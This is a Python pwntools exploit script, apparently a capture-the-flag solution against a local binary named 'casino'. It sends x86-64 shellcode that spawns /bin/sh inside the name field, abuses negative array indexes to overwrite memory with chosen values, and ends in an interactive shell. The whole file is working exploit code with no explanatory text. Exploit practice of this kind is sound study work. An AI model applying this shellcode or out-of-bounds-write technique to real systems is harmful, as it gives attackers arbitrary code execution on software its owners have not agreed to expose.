#!/usr/bin/env python

from pwn import *

r = process('./casino')

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.sendlineafter('Your name:', 'A'*16 + p32(0) + 'a'*12 + shellcode)
r.sendlineafter('Your age:', '20')
r.sendlineafter('Chose the number 0:', '0')
r.sendlineafter('Chose the number 1:', '0')
r.sendlineafter('Chose the number 2:', '0')
r.sendlineafter('Chose the number 3:', '0')
r.sendlineafter('Chose the number 4:', '0')
r.sendlineafter('Chose the number 5:', '0')
r.sendlineafter('Change the number? [1:yes 0:no]:', '1')

r.sendlineafter('Which number [1 ~ 6]:', '-43')
r.sendlineafter('Chose the number', '6299920')

r.sendlineafter('Chose the number 0:', '83')
r.sendlineafter('Chose the number 1:', '86')
r.sendlineafter('Chose the number 2:', '77')
r.sendlineafter('Chose the number 3:', '15')
r.sendlineafter('Chose the number 4:', '93')
r.sendlineafter('Chose the number 5:', '35')
r.sendlineafter('Change the number? [1:yes 0:no]:', '1')

r.sendlineafter('Which number [1 ~ 6]:', '-42')
r.sendlineafter('Chose the number', '0')

r.interactive()
